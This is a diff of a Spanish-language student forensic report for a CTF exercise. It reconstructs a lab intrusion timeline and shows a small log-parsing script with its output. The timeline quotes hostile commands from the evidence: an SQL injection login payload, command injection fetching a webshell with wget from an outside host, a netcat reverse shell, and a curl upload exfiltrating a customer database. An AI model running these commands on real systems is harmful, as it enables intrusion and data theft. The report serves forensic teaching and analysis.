@@ -7,7 +7,14 @@
 
 ## 0. Declaración de uso de IA
 
-En conformidad con las directrices éticas de la cátedra, declaramos el uso de modelos de lenguaje (LLM) como asistentes analíticos en tareas de procesamiento de texto, correlación sintáctica y verificación cruzada de evidencias. Toda la reconstrucción pericial, extracción de artefactos volátiles y en disco, verificación criptográfica de hashes de custodia y deducción de la cadena de compromiso fue validada y respaldada por los investigadores del Grupo 12 sobre la evidencia forense cruda.
+En conformidad con las directrices éticas de la cátedra y las pautas de `CONTRIBUTING.md`, declaramos el uso de modelos de lenguaje (LLM) como asistentes analíticos en tareas de estructuración, procesamiento sintáctico y correlación cruzada de evidencias. Toda la reconstrucción pericial, extracción de artefactos volátiles y en disco, verificación criptográfica de hashes de custodia, codificación del parser forense en Python y deducción de la cadena de compromiso fue validada y respaldada por los investigadores del Grupo 12:
+
+- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini).
+- **Alcance de la asistencia:** Asistencia en la estructuración general del informe pericial, redacción del resumen ejecutivo y análisis de cadena de custodia criptográfica en Secciones 1 y 2 (@gerbaudo19); asistencia en la correlación temporal cruzada entre logs de acceso, memoria y red para la Sección 3 (Línea de tiempo del ataque) y diseño del script forense `src/timeline.py` (@matiasmariatticasc).
+- **Partes originadas o modificadas:** Sección 1 (Resumen del incidente) y Sección 2 (Cadena de custodia y análisis de `auth.log`) por @gerbaudo19; Sección 3 (Línea de tiempo del ataque) y script `src/timeline.py` por @matiasmariatticasc; Secciones 4 a 7 a completar por @ColqueAlvaro y @Gonza149.
+- **Verificación humana:** Se ejecutó la verificación criptográfica con `shasum -a 256 -c` identificando el archivo manipulado. Matías Mariatti verificó y ejecutó el script `src/timeline.py` sobre `caso/logs/access.log`, comprobando que los 16 eventos de la IP atacante se clasifican con rigor en sus respectivas fases (RECON, ENUM, EXPLOIT, RCE, WEBSHELL, EXFIL) y contrastó la cronología con los artefactos de memoria (`bash_history.txt`, `pslist.txt`, `netstat.txt`).
+
+---
 
 ### Estado de los Retos (CTF Status)
 
@@ -95,12 +102,69 @@ shasum: WARNING: 1 computed checksum did NOT match
 
 ## 3. Línea de tiempo del ataque
 
-*(Sección a completar por Matías Mariatti en Commit 2)*
+A partir de la correlación exhaustiva de las distintas fuentes de evidencia digital recolectadas (registros HTTP de `access.log`, comandos en disco y memoria de `bash_history.txt`, estados de red de `netstat.txt` y lista de procesos volátiles en `pslist.txt`), se reconstruyó la secuencia cronológica unificada del incidente pericial:
 
-| Hora (UTC) | Evento | Evidencia (archivo:línea) |
-|---|---|---|
-| 02:14:02 | Reconocimiento inicial y escaneo web | `access.log:1-15` |
-| | ... | |
+| Hora (UTC) | Fase del Ataque | Evento / Acción del Atacante | Evidencia Pericial (Archivo:Línea / Detalle) |
+|---|---|---|---|
+| **02:14:03** | **Reconocimiento** | Escaneo web inicial automatizado desde la IP `185.220.101.42` utilizando la herramienta `zgrab/0.x` para identificar el servidor web. | `logs/access.log:6` (`GET / HTTP/1.1` - 200 OK) |
+| **02:14:19 - 02:14:22** | **Enumeración** | Barrido de fuerza bruta de directorios con `gobuster/3.6`, descubriendo rutas clave: `/robots.txt`, `/backup` (redirección 301), `/portal-rrhh` (200 OK) y `/uploads` (301). | `logs/access.log:7-12` |
+| **02:16:40 - 02:16:58** | **Explotación (Auth)** | Intentos de inicio de sesión fallidos en el portal interno de recursos humanos (`/portal-rrhh/login`) recibiendo código HTTP 401. | `logs/access.log:14-15` |
+| **02:17:22** | **Explotación (SQLi)** | Explotación exitosa de inyección SQL (SQLi) mediante autenticación maliciosa con el payload `user=admin'--`, logrando acceso no autorizado (HTTP 200 OK). | `logs/access.log:16` |
+| **02:17:41** | **Looting Web** | Descarga no autorizada del archivo de configuración sensible expuesto `/backup/rrhh.conf`, obteniendo el token de API privilegiado `phantom-api-7c1e`. | `logs/access.log:17` |
+| **02:18:10** | **Inyección de Comandos (RCE)** | Envío de solicitud HTTP maliciosa a la API de reportes utilizando el token obtenido (`/api/reporte?token=phantom-api-7c1e&cmd=id`), confirmando ejecución de comandos como `www-data`. | `logs/access.log:18` |
+| **02:18:33** | **Ejecución de Código** | Ejecución de comando para escribir la bandera de prueba en el directorio temporal (`cmd=echo FLAG{dfir_vector_sqli} > /tmp/.p`). | `logs/access.log:19` (Captura de reto R1) |
+| **02:19:02** | **Despliegue de Puerta Trasera** | Descarga e instalación de una webshell persistente mediante comando remoto `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. Proceso secundario registrado en memoria: `PID 1201 (sh -c wget)`. | `logs/access.log:20`<br>`memoria/pslist.txt:6`<br>`memoria/netstat.txt:5` (`TIME_WAIT 45.13.37.7:80`) |
+| **02:19:48** | **Verificación de Webshell** | Verificación interactiva de la webshell en `/uploads/shell.php?c=whoami` obteniendo respuesta del usuario de servicio. Archivo confirmado en disco con bandera `FLAG{dfir_webshell_hallado}`. | `logs/access.log:21`<br>`disco/var/www/uploads/shell.php.evidencia.txt` |
+| **02:23:15** | **Acceso a Datos Confidenciales** | Lectura preliminar de la base de datos de clientes corporativos mediante petición HTTP a la webshell (`/uploads/shell.php?c=cat /app/priv/clientes.db.txt`). | `logs/access.log:22` (Respuesta de 48.210 bytes) |
+| **02:24:00 - 02:25:00** | **Shell Interactiva** | El atacante abre una shell interactiva bash en el sistema como usuario `www-data` (`PID 1240`). | `memoria/pslist.txt:7` |
+| **02:25:30** | **Reconocimiento Local** | Enumeración de archivos de configuración (`cat /var/www/.env`) y búsqueda exhaustiva de binarios con permisos especiales (`find / -perm -4000 -type f`). | `memoria/bash_history.txt:3,5` |
+| **02:26:15** | **Escalada de Privilegios (SUID)** | Abuso del binario SUID `/usr/local/bin/system-check` con flag privilegiado `-p` para preservar `euid=0`, escalando a superusuario (`root`). Proceso volátil registrado: `PID 1477 (system-check)`. | `memoria/bash_history.txt:6-7`<br>`memoria/pslist.txt:8` (`FLAG{dfir_privesc_suid}`) |
+| **02:27:00** | **Canal C2 / Reverse Shell** | Establecimiento de conexión de Comando y Control (C2) interactiva reversa hacia el servidor externo `45.13.37.7:4444` mediante `netcat` bajo contexto de `root` (`PID 1490`). | `memoria/pslist.txt:9`<br>`memoria/netstat.txt:4` (`ESTABLISHED 10.0.0.5:41022 -> 45.13.37.7:4444`) |
+| **02:28:10** | **Empaquetado de Datos** | Compresión y empaquetado de la base de datos confidencial de clientes en un archivo oculto temporal: `tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt`. | `memoria/bash_history.txt:8` |
+| **02:29:20** | **Exfiltración de Datos** | Transmisión del archivo comprimido al servidor C2 vía HTTP POST: `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`. | `memoria/bash_history.txt:9` |
+| **02:30:15 - 02:45:00** | **Anti-Forensics / Evasión** | Ejecución de `history -c` para purgar el historial en disco y manipulación intencional de `logs/auth.log` eliminando las entradas de sesión, corrompiendo la firma de custodia (`FLAG{dfir_custodia_alterada}`). | `memoria/bash_history.txt:10`<br>`logs/auth.log:86-90` |
+
+---
+
+### Script automatizado de reconstrucción cronológica (`src/timeline.py`)
+
+Para agilizar el análisis pericial sobre grandes volúmenes de logs sin depender de inspección visual manual, se implementó el parser forense `src/timeline.py`. El script parsea registros en formato Nginx *combined*, filtra de forma determinista la dirección IP bajo investigación (`--ip 185.220.101.42`) y clasifica cada solicitud en su fase táctica correspondiente:
+
+```python
+def construir_timeline(path: str, ip: str = None) -> list:
+    eventos = []
+    with open(path, "r", encoding="utf-8") as f:
+        for linea in f:
+            e = parsear_linea(linea.strip())
+            if not e:
+                continue
+            if ip is None or e["ip"] == ip:
+                eventos.append(e)
+    return eventos
+```
+
+**Salida de ejecución pericial de `src/timeline.py`:**
+
+```bash
+$ python3 src/timeline.py caso/logs/access.log --ip 185.220.101.42
+[*] 16 eventos de 185.220.101.42
+  05/Sep/2026:02:14:03 +0000  GET  /                                        [RECON]
+  05/Sep/2026:02:14:19 +0000  GET  /robots.txt                              [RECON]
+  05/Sep/2026:02:14:20 +0000  GET  /admin                                   [ENUM]
+  05/Sep/2026:02:14:20 +0000  GET  /login                                   [EXPLOIT]
+  05/Sep/2026:02:14:21 +0000  GET  /backup                                  [ENUM]
+  05/Sep/2026:02:14:21 +0000  GET  /portal-rrhh                             [ENUM]
+  05/Sep/2026:02:14:22 +0000  GET  /uploads                                 [ENUM]
+  05/Sep/2026:02:16:40 +0000  POST /portal-rrhh/login                       [EXPLOIT]
+  05/Sep/2026:02:16:58 +0000  POST /portal-rrhh/login                       [EXPLOIT]
+  05/Sep/2026:02:17:22 +0000  POST /portal-rrhh/login                       [EXPLOIT]
+  05/Sep/2026:02:17:41 +0000  GET  /backup/rrhh.conf                        [ENUM]
+  05/Sep/2026:02:18:10 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=id [RCE]
+  05/Sep/2026:02:18:33 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p [RCE]
+  05/Sep/2026:02:19:02 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php [WEBSHELL]
+  05/Sep/2026:02:19:48 +0000  GET  /uploads/shell.php?c=whoami              [WEBSHELL]
+  05/Sep/2026:02:23:15 +0000  GET  /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt [EXFIL]
+```
 
 ---
 
